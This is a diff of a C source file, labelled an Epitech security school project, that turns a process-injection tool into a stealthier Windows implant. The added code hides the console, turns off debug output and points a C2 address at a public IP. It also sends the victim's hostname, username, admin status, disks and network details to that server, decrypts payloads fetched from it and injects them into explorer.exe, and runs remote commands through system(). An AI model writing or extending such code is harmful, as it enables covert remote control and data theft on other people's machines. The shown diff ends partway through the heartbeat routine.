@@ -1,6 +1,5 @@
 // ============================================================================
 // EDUCATIONAL PROJECT - EPITECH T-SEC
-// Process Injection Educational Tool v7
 // ============================================================================
 
 // ============================================================================
@@ -10,6 +9,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
+#include <time.h>
 #include "nt.h"
 #include <tlhelp32.h>
 #include <rpc.h>
@@ -20,6 +20,7 @@
     #include <iphlpapi.h>
     #pragma comment(lib, "iphlpapi.lib")
     #pragma comment(lib, "ws2_32.lib")
+    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #else
     #include <sys/utsname.h>
     #include <sys/sysinfo.h>
@@ -39,7 +40,7 @@
 // ============================================================================
 // DEBUG MODE CONFIGURATION
 // ============================================================================
-int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable
+int DEBUG_MODE = 0; // 1 to enable debug, 0 to disable
 
 #define DEBUG(x, ...) if (DEBUG_MODE) { printf(x, ##__VA_ARGS__); }
 
@@ -53,10 +54,11 @@ int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable
 #define THRESHOLD_MIN_RAM_MB 2048
 
 // C2 SERVER CONFIGURATION
-#define C2_SERVER "192.168.162.1"
+#define C2_SERVER "162.19.242.23"
 #define C2_PORT 3000
 #define C2_REGISTER_PATH "/heartbeat/register"
-#define C2_ARCH_UPDATE_PATH "/heartbeat/arch"
+#define C2_HEARTBEAT_PATH "/heartbeat"
+#define C2_ARCH_UPDATE_PATH "/api/agent/system-info"
 
 
 // ============================================================================
@@ -314,13 +316,8 @@ void reverse_string(unsigned char* str, size_t length) {
  * @param key: Clé XOR
  */
 void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char key) {
-    // Étape 1: Reverse la chaîne complète
     reverse_string(encrypted, length);
-
-    // Étape 2: Déchiffrement XOR (sans toucher au dernier byte qui sera le null terminator)
     decrypt(encrypted, length - 1, key);
-
-    // Étape 3: Ajouter le null terminator à la fin
     encrypted[length - 1] = '\0';
 }
 
@@ -1016,6 +1013,106 @@ int system_info_to_json(const SystemInfo* info, char* buffer, size_t buffer_size
     return 0;
 }
 
+/**
+ * Convert architecture to simplified string for C2 format
+ */
+const char* architecture_to_simple_string(Architecture arch) {
+    switch (arch) {
+        case ARCH_X86:      return "x86";
+        case ARCH_X86_64:   return "x86_64";
+        case ARCH_ARM:      return "arm";
+        case ARCH_ARM64:    return "arm64";
+        case ARCH_MIPS:     return "mips";
+        case ARCH_PPC:      return "ppc";
+        default:            return "unknown";
+    }
+}
+
+/**
+ * Serializes system information to JSON in C2 expected format
+ */
+int system_info_to_c2_json(const char* agent_id, const SystemInfo* info, char* buffer, size_t buffer_size) {
+    if (!agent_id || !info || !buffer) {
+        DEBUG("[ERROR] Invalid arguments to system_info_to_c2_json\n");
+        return -1;
+    }
+
+    int written = 0;
+    int ret;
+
+    #define SAFE_APPEND(...) do { \
+        ret = snprintf(buffer + written, buffer_size - written, __VA_ARGS__); \
+        if (ret < 0) { \
+            DEBUG("[ERROR] JSON serialization encoding error\n"); \
+            return -1; \
+        } \
+        if (written + ret >= buffer_size) { \
+            DEBUG("[ERROR] JSON buffer overflow: need %d bytes, have %zu\n", written + ret, buffer_size); \
+            return -1; \
+        } \
+        written += ret; \
+    } while(0)
+
+    // Root object with agent_id
+    SAFE_APPEND("{\n");
+    SAFE_APPEND("  \"agent_id\": \"%s\",\n", agent_id);
+
+    // System section
+    SAFE_APPEND("  \"system\": {\n");
+    SAFE_APPEND("    \"architecture\": \"%s\",\n", architecture_to_simple_string(info->architecture));
+    SAFE_APPEND("    \"os\": \"%s\",\n", info->os_version);
+    SAFE_APPEND("    \"hostname\": \"%s\",\n", info->hostname);
+    SAFE_APPEND("    \"username\": \"%s\",\n", info->username);
+    SAFE_APPEND("    \"userType\": \"%s\",\n", info->is_admin ? "Admin" : "User");
+    SAFE_APPEND("    \"virtualMachine\": %s,\n", info->is_vm ? "true" : "false");
+    SAFE_APPEND("    \"uptimeSeconds\": %llu\n", (unsigned long long)info->uptime_seconds);
+    SAFE_APPEND("  },\n");
+
+    // CPU section
+    SAFE_APPEND("  \"cpu\": {\n");
+    SAFE_APPEND("    \"model\": \"%s\",\n", info->cpu_model);
+    SAFE_APPEND("    \"processors\": %d,\n", info->nb_processors);
+    SAFE_APPEND("    \"logicalCores\": %d\n", info->nb_logical_cores);
+    SAFE_APPEND("  },\n");
+
+    // Memory section
+    SAFE_APPEND("  \"memory\": {\n");
+    SAFE_APPEND("    \"totalMb\": %llu\n", (unsigned long long)info->total_ram_mb);
+    SAFE_APPEND("  },\n");
+
+    // Disks array
+    SAFE_APPEND("  \"disks\": [\n");
+    for (int i = 0; i < info->nb_disks; i++) {
+        const DiskInfo* disk = &info->disks[i];
+        SAFE_APPEND("    {\n");
+        SAFE_APPEND("      \"name\": \"%s\",\n", disk->name);
+        SAFE_APPEND("      \"filesystem\": \"%s\",\n", disk->filesystem);
+        SAFE_APPEND("      \"totalGb\": %.2f,\n", disk->total_space / (1024.0 * 1024.0 * 1024.0));
+        SAFE_APPEND("      \"freeGb\": %.2f\n", disk->free_space / (1024.0 * 1024.0 * 1024.0));
+        SAFE_APPEND("    }%s\n", (i < info->nb_disks - 1) ? "," : "");
+    }
+    SAFE_APPEND("  ],\n");
+
+    // Network array
+    SAFE_APPEND("  \"network\": [\n");
+    for (int i = 0; i < info->nb_interfaces; i++) {
+        const NetworkInterface* iface = &info->interfaces[i];
+        SAFE_APPEND("    {\n");
+        SAFE_APPEND("      \"ip\": \"%s\",\n", iface->ip_address);
+        SAFE_APPEND("      \"mac\": \"%s\",\n", iface->mac_address);
+        SAFE_APPEND("      \"status\": \"%s\"\n", iface->is_up ? "UP" : "DOWN");
+        SAFE_APPEND("    }%s\n", (i < info->nb_interfaces - 1) ? "," : "");
+    }
+    SAFE_APPEND("  ]\n");
+
+    SAFE_APPEND("}\n");
+
+    #undef SAFE_APPEND
+
+    DEBUG("[DEBUG] C2 JSON serialization written %d bytes\n", written);
+    return 0;
+}
+
 
 // ============================================================================
 // C2 COMMUNICATION STRUCTURES
@@ -1025,7 +1122,48 @@ typedef struct {
     char agent_id[64];
     char xor_key[128];
     int registered;
-} C2Response;
+} C2RegistrationResponse;
+
+// Task types
+typedef enum {
+    TASK_NONE = 0,
+    TASK_INJECT = 1,
+    TASK_EXECUTE_CMD = 2,
+    TASK_DOWNLOAD = 3,
+    TASK_UPLOAD = 4,
+    TASK_SLEEP = 5,
+    TASK_EXIT = 6
+} TaskType;
+
+typedef struct {
+    TaskType type;
+    char task_id[64];
+    char target_process[256];
+    unsigned char* payload;
+    size_t payload_size;
+    char command[1024];
+    int sleep_duration;
+} Task;
+
+
+// ============================================================================
+// FUNCTION PROTOTYPES
+// ============================================================================
+
+// Injection functions
+int initialize_injection_apis(unsigned char xor_key);
+int perform_injection(const char* process_name, unsigned char* payload, size_t payload_size);
+HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID);
+
+// Task execution
+int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key);
+
+// C2 communication
+int parse_c2_response(const char* json, C2RegistrationResponse* response);
+int parse_payload_from_response(const char* json, Task* task, const char* xor_key_str);
+int register_with_c2(const char* uuid, const char* system_info_json, C2RegistrationResponse* response);
+int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buffer_size);
+int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo);
 
 
 // ============================================================================
@@ -1036,10 +1174,10 @@ typedef struct {
  * Parse JSON response from C2 server
  * Simple JSON parser for our specific response format
  */
-int parse_c2_response(const char* json, C2Response* response) {
+int parse_c2_response(const char* json, C2RegistrationResponse* response) {
     if (!json || !response) return -1;
 
-    memset(response, 0, sizeof(C2Response));
+    memset(response, 0, sizeof(C2RegistrationResponse));
     response->registered = 0;
 
     // Parse status
@@ -1095,10 +1233,461 @@ int parse_c2_response(const char* json, C2Response* response) {
 }
 
 /**
+ * Parse task from JSON response
+ * Returns 1 if task found, 0 if no task, -1 on error
+ */
+int parse_task_from_response(const char* json, Task* task) {
+    if (!json || !task) return -1;
+
+    memset(task, 0, sizeof(Task));
+    task->type = TASK_NONE;
+
+    // Look for "task" field
+    const char* task_pos = strstr(json, "\"task\"");
+    if (!task_pos) {
+        DEBUG("[Task Parser] No task field in response\n");
+        return 0; // No task
+    }
+
+    // Parse task type
+    const char* type_pos = strstr(task_pos, "\"type\"");
+    if (type_pos) {
+        const char* value_start = strchr(type_pos, ':');
+        if (value_start) {
+            value_start = strchr(value_start, '"');
+            if (value_start) {
+                value_start++;
+
+                if (strncmp(value_start, "inject", 6) == 0) {
+                    task->type = TASK_INJECT;
+                } else if (strncmp(value_start, "execute", 7) == 0) {
+                    task->type = TASK_EXECUTE_CMD;
+                } else if (strncmp(value_start, "download", 8) == 0) {
+                    task->type = TASK_DOWNLOAD;
+                } else if (strncmp(value_start, "upload", 6) == 0) {
+                    task->type = TASK_UPLOAD;
+                } else if (strncmp(value_start, "sleep", 5) == 0) {
+                    task->type = TASK_SLEEP;
+                } else if (strncmp(value_start, "exit", 4) == 0) {
+                    task->type = TASK_EXIT;
+                }
+            }
+        }
+    }
+
+    if (task->type == TASK_NONE) {
+        DEBUG("[Task Parser] Unknown or missing task type\n");
+        return 0;
+    }
+
+    // Parse task_id
+    const char* id_pos = strstr(task_pos, "\"task_id\"");
+    if (id_pos) {
+        const char* value_start = strchr(id_pos, ':');
+        if (value_start) {
+            value_start = strchr(value_start, '"');
+            if (value_start) {
+                value_start++;
+                const char* value_end = strchr(value_start, '"');
+                if (value_end) {
+                    size_t len = value_end - value_start;
+                    if (len < sizeof(task->task_id)) {
+                        strncpy(task->task_id, value_start, len);
+                        task->task_id[len] = '\0';
+                    }
+                }
+            }
+        }
+    }
+
+    // Parse type-specific fields
+    if (task->type == TASK_INJECT) {
+        // Parse target_process
+        const char* proc_pos = strstr(task_pos, "\"target_process\"");
+        if (proc_pos) {
+            const char* value_start = strchr(proc_pos, ':');
+            if (value_start) {
+                value_start = strchr(value_start, '"');
+                if (value_start) {
+                    value_start++;
+                    const char* value_end = strchr(value_start, '"');
+                    if (value_end) {
+                        size_t len = value_end - value_start;
+                        if (len < sizeof(task->target_process)) {
+                            strncpy(task->target_process, value_start, len);
+                            task->target_process[len] = '\0';
+                        }
+                    }
+                }
+            }
+        }
+
+        // Parse payload (base64 encoded)
+        const char* payload_pos = strstr(task_pos, "\"payload\"");
+        if (payload_pos) {
+            const char* value_start = strchr(payload_pos, ':');
+            if (value_start) {
+                value_start = strchr(value_start, '"');
+                if (value_start) {
+                    value_start++;
+                    const char* value_end = strchr(value_start, '"');
+                    if (value_end) {
+                        // For now, just note payload length
+                        // TODO: Implement base64 decode
+                        DEBUG("[Task Parser] Payload found (base64 encoded)\n");
+                    }
+                }
+            }
+        }
+    } else if (task->type == TASK_EXECUTE_CMD) {
+        // Parse command
+        const char* cmd_pos = strstr(task_pos, "\"command\"");
+        if (cmd_pos) {
+            const char* value_start = strchr(cmd_pos, ':');
+            if (value_start) {
+                value_start = strchr(value_start, '"');
+                if (value_start) {
+                    value_start++;
+                    const char* value_end = strchr(value_start, '"');
+                    if (value_end) {
+                        size_t len = value_end - value_start;
+                        if (len < sizeof(task->command)) {
+                            strncpy(task->command, value_start, len);
+                            task->command[len] = '\0';
+                        }
+                    }
+                }
+            }
+        }
+    } else if (task->type == TASK_SLEEP) {
+        // Parse sleep duration
+        const char* duration_pos = strstr(task_pos, "\"duration\"");
+        if (duration_pos) {
+            const char* value_start = strchr(duration_pos, ':');
+            if (value_start) {
+                task->sleep_duration = atoi(value_start + 1);
+            }
+        }
+    }
+
+    DEBUG("[Task Parser] Task parsed successfully: type=%d, id=%s\n",
+          task->type, task->task_id);
+    return 1;
+}
+
+/**
+ * Simple hex char to byte conversion
+ */
+int hex_char_to_byte(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+/**
+ * Convert hex string to bytes
+ * Returns number of bytes decoded, or -1 on error
+ */
+int hex_to_bytes(const char* hex, unsigned char* bytes, size_t max_bytes) {
+    if (!hex || !bytes) return -1;
+
+    size_t hex_len = strlen(hex);
+    if (hex_len % 2 != 0) return -1; // Hex string must have even length
+
+    size_t byte_count = hex_len / 2;
+    if (byte_count > max_bytes) return -1;
+
+    for (size_t i = 0; i < byte_count; i++) {
+        int high = hex_char_to_byte(hex[i * 2]);
+        int low = hex_char_to_byte(hex[i * 2 + 1]);
+
+        if (high < 0 || low < 0) return -1;
+
+        bytes[i] = (unsigned char)((high << 4) | low);
+    }
+
+    return (int)byte_count;
+}
+
+/**
+ * Base64 decode table
+ */
+static const unsigned char base64_decode_table[256] = {
+    ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,  ['F'] = 5,  ['G'] = 6,  ['H'] = 7,
+    ['I'] = 8,  ['J'] = 9,  ['K'] = 10, ['L'] = 11, ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15,
+    ['Q'] = 16, ['R'] = 17, ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
+    ['Y'] = 24, ['Z'] = 25, ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29, ['e'] = 30, ['f'] = 31,
+    ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35, ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39,
+    ['o'] = 40, ['p'] = 41, ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47,
+    ['w'] = 48, ['x'] = 49, ['y'] = 50, ['z'] = 51, ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55,
+    ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59, ['8'] = 60, ['9'] = 61, ['+'] = 62, ['/'] = 63
+};
+
+/**
+ * Convert Base64 string to bytes
+ * Returns number of bytes decoded, or -1 on error
+ */
+int base64_to_bytes(const char* base64, unsigned char* bytes, size_t max_bytes) {
+    if (!base64 || !bytes) return -1;
+
+    size_t input_len = strlen(base64);
+    if (input_len == 0) return 0;
+
+    // Calculate output size
+    size_t output_len = (input_len * 3) / 4;
+
+    // Count padding
+    if (base64[input_len - 1] == '=') output_len--;
+    if (input_len > 1 && base64[input_len - 2] == '=') output_len--;
+
+    if (output_len > max_bytes) return -1;
+
+    size_t j = 0;
+    unsigned int bits = 0;
+    int bit_count = 0;
+
+    for (size_t i = 0; i < input_len; i++) {
+        unsigned char c = base64[i];
+
+        if (c == '=') break; // Padding
+        if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue; // Skip whitespace
+
+        // Check if valid base64 character
+        if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+              (c >= '0' && c <= '9') || c == '+' || c == '/')) {
+            return -1; // Invalid character
+        }
+
+        bits = (bits << 6) | base64_decode_table[c];
+        bit_count += 6;
+
+        if (bit_count >= 8) {
+            bit_count -= 8;
+            if (j >= max_bytes) return -1;
+            bytes[j++] = (unsigned char)((bits >> bit_count) & 0xFF);
+        }
+    }
+
+    return (int)j;
+}
+
+/**
+ * Check if string is hexadecimal
+ */
+int is_hex_string(const char* str) {
+    if (!str) return 0;
+    size_t len = strlen(str);
+    if (len == 0 || len % 2 != 0) return 0;
+
+    for (size_t i = 0; i < len; i++) {
+        char c = str[i];
+        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+/**
+ * Parse XOR key from string to byte
+ * Converts hex string to single byte value
+ */
+unsigned char parse_xor_key(const char* xor_key_str) {
+    if (!xor_key_str || strlen(xor_key_str) < 2) {
+        DEBUG("[XOR Key Parser - Warning] Invalid XOR key, using default 0x00\n");
+        return 0x00;
+    }
+
+    // If it's a hex string (e.g., "0x35" or "35")
+    const char* hex_start = xor_key_str;
+    if (strncmp(xor_key_str, "0x", 2) == 0 || strncmp(xor_key_str, "0X", 2) == 0) {
+        hex_start += 2;
+    }
+
+    int high = hex_char_to_byte(hex_start[0]);
+    int low = hex_char_to_byte(hex_start[1]);
+
+    if (high < 0 || low < 0) {
+        DEBUG("[XOR Key Parser - Warning] Failed to parse XOR key, using default 0x00\n");
+        return 0x00;
+    }
+
+    unsigned char key = (unsigned char)((high << 4) | low);
+    DEBUG("[XOR Key Parser] Parsed XOR key: 0x%02X\n", key);
+    return key;
+}
+
+/**
+ * Parse payload from C2 response
+ * Format: {"status": "online", "tasks": [], "payload": "hex_string"}
+ * The payload is XOR encrypted and must be decrypted with xor_key
+ * Returns 1 if payload found, 0 if no payload (null), -1 on error
+ */
+int parse_payload_from_response(const char* json, Task* task, const char* xor_key_str) {
+    if (!json || !task) return -1;
+
+    memset(task, 0, sizeof(Task));
+    task->type = TASK_NONE;
+
+    DEBUG("[Payload Parser] Parsing C2 response...\n");
+
+    // Look for "payload" field
+    const char* payload_pos = strstr(json, "\"payload\"");
+    if (!payload_pos) {
+        DEBUG("[Payload Parser] No payload field in response\n");
+        return 0;
+    }
+
+    // Find the value after "payload":
+    const char* value_start = strchr(payload_pos, ':');
+    if (!value_start) {
+        DEBUG("[Payload Parser] Malformed payload field\n");
+        return -1;
+    }
+    value_start++;
+
+    // Skip whitespace
+    while (*value_start == ' ' || *value_start == '\t' || *value_start == '\n' || *value_start == '\r') {
+        value_start++;
+    }
+
+    // Check if payload is null
+    if (strncmp(value_start, "null", 4) == 0) {
+        DEBUG("[Payload Parser] Payload is null, no injection to perform\n");
+        return 0;
+    }
+
+    // Check if payload is an object (new format with "data" field)
+    if (*value_start == '{') {
+        DEBUG("[Payload Parser] Payload is an object, looking for 'data' field...\n");
+
+        const char* data_pos = strstr(value_start, "\"data\"");
+        if (!data_pos) {
+            DEBUG("[Payload Parser] No 'data' field in payload object\n");
+            return -1;
+        }
+
+        const char* data_value_start = strchr(data_pos, ':');
+        if (!data_value_start) {
+            DEBUG("[Payload Parser] Malformed 'data' field\n");
+            return -1;
+        }
+        data_value_start++;
+
+        while (*data_value_start == ' ' || *data_value_start == '\t' || *data_value_start == '\n' || *data_value_start == '\r') {
+            data_value_start++;
+        }
+
+        if (*data_value_start != '"') {
+            DEBUG("[Payload Parser] 'data' field is not a string\n");
+            return -1;
+        }
+        data_value_start++;
+
+        value_start = data_value_start;
+    }
+    else if (*value_start == '"') {
+        DEBUG("[Payload Parser] Payload is a direct string\n");
+        value_start++;
+    }
+    else {
+        DEBUG("[Payload Parser] Payload is neither a string nor an object\n");
+        return -1;
+    }
+
+    const char* value_end = strchr(value_start, '"');
+    if (!value_end) {
+        DEBUG("[Payload Parser] Malformed payload string\n");
+        return -1;
+    }
+
+    size_t encoded_len = value_end - value_start;
+    if (encoded_len == 0) {
+        DEBUG("[Payload Parser] Empty payload string\n");
+        return 0;
+    }
+
+    // Copy the encoded string
+    char* encoded_string = (char*)malloc(encoded_len + 1);
+    if (!encoded_string) {
+        DEBUG("[Payload Parser - Error] Failed to allocate memory for encoded string\n");
+        return -1;
+    }
+    strncpy(encoded_string, value_start, encoded_len);
+    encoded_string[encoded_len] = '\0';
+
+    // Detect if it's hex or base64
+    int is_hex = is_hex_string(encoded_string);
+    size_t max_payload_size;
+
+    if (is_hex) {
+        DEBUG("[Payload Parser] Detected hex encoding (length: %zu)\n", encoded_len);
+        max_payload_size = encoded_len / 2 + 1;
+    } else {
+        DEBUG("[Payload Parser] Detected Base64 encoding (length: %zu)\n", encoded_len);
+        max_payload_size = (encoded_len * 3) / 4 + 1;
+    }
+
+    // Allocate buffer for decoded payload
+    task->payload = (unsigned char*)malloc(max_payload_size);
+    if (!task->payload) {
+        free(encoded_string);
+        DEBUG("[Payload Parser - Error] Failed to allocate memory for payload\n");
+        return -1;
+    }
+
+    // Decode using appropriate decoder
+    int decoded_size;
+    if (is_hex) {
+        decoded_size = hex_to_bytes(encoded_string, task->payload, max_payload_size);
+        if (decoded_size < 0) {
+            free(task->payload);
+            free(encoded_string);
+            task->payload = NULL;
+            DEBUG("[Payload Parser - Error] Failed to decode hex payload\n");
+            return -1;
+        }
+        DEBUG("[Payload Parser] Payload decoded from hex: %d bytes\n", decoded_size);
+    } else {
+        decoded_size = base64_to_bytes(encoded_string, task->payload, max_payload_size);
+        if (decoded_size < 0) {
+            free(task->payload);
+            free(encoded_string);
+            task->payload = NULL;
+            DEBUG("[Payload Parser - Error] Failed to decode Base64 payload\n");
+            return -1;
+        }
+        DEBUG("[Payload Parser] Payload decoded from Base64: %d bytes\n", decoded_size);
+    }
+
+    free(encoded_string);
+
+    // Decrypt payload with XOR key
+    unsigned char xor_key = parse_xor_key(xor_key_str);
+    DEBUG("[Payload Parser] Decrypting payload with XOR key: 0x%02X\n", xor_key);
+
+    decrypt(task->payload, decoded_size, xor_key);
+
+    DEBUG("[Payload Parser - Success] Payload decrypted: %d bytes\n", decoded_size);
+
+    task->payload_size = (size_t)decoded_size;
+    task->type = TASK_INJECT;
+
+    // Use default target process (explorer.exe)
+    strcpy(task->target_process, "explorer.exe");
+    snprintf(task->task_id, sizeof(task->task_id), "inject-%lu", (unsigned long)time(NULL));
+
+    DEBUG("[Payload Parser] Target process: %s\n", task->target_process);
+
+    return 1;
+}
+
+/**
  * Register agent with C2 server
  * Sends system info and UUID, receives agent_id and xor_key
  */
-int register_with_c2(const char* uuid, const char* system_info_json, C2Response* response) {
+int register_with_c2(const char* uuid, const char* system_info_json, C2RegistrationResponse* response) {
     DEBUG("[C2 - Start] Registering with C2 server %s:%d\n", C2_SERVER, C2_PORT);
 
     WSADATA wsaData;
@@ -1210,13 +1799,50 @@ int register_with_c2(const char* uuid, const char* system_info_json, C2Response*
 
 
 
-//send_architecture_to_c2(c2_response.agent_id, json_buffer);
-void send_architecture_to_c2(const char* agent_id, const char* architecture) {
-    char http_request[16384];
-    char post_body[8192];
-    snprintf(post_body, sizeof(post_body),
-             "{\"agent_id\":\"%s\",\"architecture\":\"%s\"}",
-             agent_id, architecture);
+/**
+ * Send architecture information to C2 server
+ */
+int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo) {
+    DEBUG("[C2 - Arch Update] Sending system architecture to C2 server %s:%d\n", C2_SERVER, C2_PORT);
+
+    // Generate C2 format JSON
+    char c2_json_buffer[16384];
+    if (system_info_to_c2_json(agent_id, sysInfo, c2_json_buffer, sizeof(c2_json_buffer)) != 0) {
+        DEBUG("[C2 - Arch Update - Error] Failed to serialize system info to C2 JSON format\n");
+        return -1;
+    }
+
+    DEBUG("[C2 - Arch Update - JSON] Payload:\n%s\n", c2_json_buffer);
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        DEBUG("[C2 - Arch Update - Error] WSAStartup failed: %d\n", WSAGetLastError());
+        return -1;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        DEBUG("[C2 - Arch Update - Error] Socket creation failed: %d\n", WSAGetLastError());
+        WSACleanup();
+        return -1;
+    }
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(C2_PORT);
+    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
+
+    DEBUG("[C2 - Arch Update - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        DEBUG("[C2 - Arch Update - Error] Connection failed: %d\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+    DEBUG("[C2 - Arch Update - Connect] Connected successfully\n");
+
+    // Build HTTP POST request
+    char http_request[32768];
     snprintf(http_request, sizeof(http_request),
              "POST %s HTTP/1.1\r\n"
              "Host: %s:%d\r\n"
@@ -1225,10 +1851,215 @@ void send_architecture_to_c2(const char* agent_id, const char* architecture) {
              "Connection: close\r\n"
              "\r\n"
              "%s",
-             C2_ARCH_UPDATE_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);
-    // Send HTTP request (similar to register_with_c2)
-    DEBUG("[C2 - Arch Update] Sending architecture update to C2 server...\n");
+             C2_ARCH_UPDATE_PATH, C2_SERVER, C2_PORT, strlen(c2_json_buffer), c2_json_buffer);
+
+    // Send HTTP request
+    DEBUG("[C2 - Arch Update - Send] Sending architecture update...\n");
+    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
+        DEBUG("[C2 - Arch Update - Error] Send failed: %d\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+    DEBUG("[C2 - Arch Update - Send] Request sent successfully\n");
+
+    // Receive HTTP response
+    char recv_buffer[8192] = {0};
+    int total_received = 0;
+    int bytes_received;
+
+    DEBUG("[C2 - Arch Update - Receive] Waiting for response...\n");
+    while ((bytes_received = recv(sock, recv_buffer + total_received,
+                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
+        total_received += bytes_received;
+        if (total_received >= sizeof(recv_buffer) - 1) break;
+    }
+
+    if (total_received > 0) {
+        recv_buffer[total_received] = '\0';
+        DEBUG("[C2 - Arch Update - Receive] Received %d bytes\n", total_received);
+    } else {
+        DEBUG("[C2 - Arch Update - Warning] No response received\n");
+    }
+
+    // Cleanup
+    closesocket(sock);
+    WSACleanup();
+
+    DEBUG("[C2 - Arch Update - Success] Architecture update completed\n");
+    return 0;
 }
+
+
+
+
+/**
+ * Execute a task received from C2
+ */
+int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key) {
+    if (!task) return -1;
+
+    DEBUG("[Task Execution] Executing task: type=%d, id=%s\n", task->type, task->task_id);
+
+    switch (task->type) {
+        case TASK_INJECT:
+            DEBUG("[Task Execution - Inject] Target process: %s\n", task->target_process);
+
+            // Initialize injection APIs if not already done
+            if (initialize_injection_apis(xor_function_key) != 0) {
+                DEBUG("[Task Execution - Inject - Error] Failed to initialize injection APIs\n");
+                return -1;
+            }
+
+            // Use provided payload or default test payload
+            unsigned char default_payload[] = { 0x90, 0x90, 0x90, 0x90, 0xDE, 0xAD, 0xBE, 0xEF };
+            unsigned char* payload = task->payload ? task->payload : default_payload;
+            size_t payload_size = task->payload_size > 0 ? task->payload_size : sizeof(default_payload);
+
+            if (perform_injection(task->target_process, payload, payload_size) == 0) {
+                DEBUG("[Task Execution - Inject - Success] Injection completed successfully\n");
+                return 0;
+            } else {
+                DEBUG("[Task Execution - Inject - Error] Injection failed\n");
+                return -1;
+            }
+            break;
+
+        case TASK_EXECUTE_CMD:
+            DEBUG("[Task Execution - Execute] Command: %s\n", task->command);
+            // Execute command using system()
+            int result = system(task->command);
+            DEBUG("[Task Execution - Execute - Complete] Command executed with result: %d\n", result);
+            return 0;
+
+        case TASK_SLEEP:
+            DEBUG("[Task Execution - Sleep] Sleeping for %d ms\n", task->sleep_duration);
+            Sleep(task->sleep_duration);
+            DEBUG("[Task Execution - Sleep - Complete] Sleep finished\n");
+            return 0;
+
+        case TASK_EXIT:
+            DEBUG("[Task Execution - Exit] Exiting agent\n");
+            exit(0);
+            break;
+
+        case TASK_DOWNLOAD:
+            DEBUG("[Task Execution - Download] Not implemented yet\n");
+            return -1;
+
+        case TASK_UPLOAD:
+            DEBUG("[Task Execution - Upload] Not implemented yet\n");
+            return -1;
+
+        default:
+            DEBUG("[Task Execution - Error] Unknown task type: %d\n", task->type);
+            return -1;
+    }
+
+    return 0;
+}
+
+int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buffer_size) {
+    DEBUG("[C2 - Heartbeat] Sending heartbeat to C2 server %s:%d\n", C2_SERVER, C2_PORT);
+
+    if (response_buffer) {
+        response_buffer[0] = '\0';
+    }
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        DEBUG("[C2 - Heartbeat - Error] WSAStartup failed: %d\n", WSAGetLastError());
+        return -1;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        DEBUG("[C2 - Heartbeat - Error] Socket creation failed: %d\n", WSAGetLastError());
+        WSACleanup();
+        return -1;
+    }
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(C2_PORT);
+    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
+
+    DEBUG("[C2 - Heartbeat - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        DEBUG("[C2 - Heartbeat - Error] Connection failed: %d\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+    DEBUG("[C2 - Heartbeat - Connect] Connected successfully\n");
+
+    // Build HTTP POST request with JSON body
+    char http_request[1024];
+    char post_body[256];
+
+    snprintf(post_body, sizeof(post_body),
+             "{\"agent_id\":\"%s\"}",
+             agent_id);
+
+    snprintf(http_request, sizeof(http_request),
+             "POST %s HTTP/1.1\r\n"
+             "Host: %s:%d\r\n"
+             "Content-Type: application/json\r\n"
+             "Content-Length: %zu\r\n"
+             "Connection: close\r\n"
+             "\r\n"
+             "%s",
+             C2_HEARTBEAT_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);
+
+    // Send HTTP request
+    DEBUG("[C2 - Heartbeat - Send] Sending heartbeat with body: %s\n", post_body);
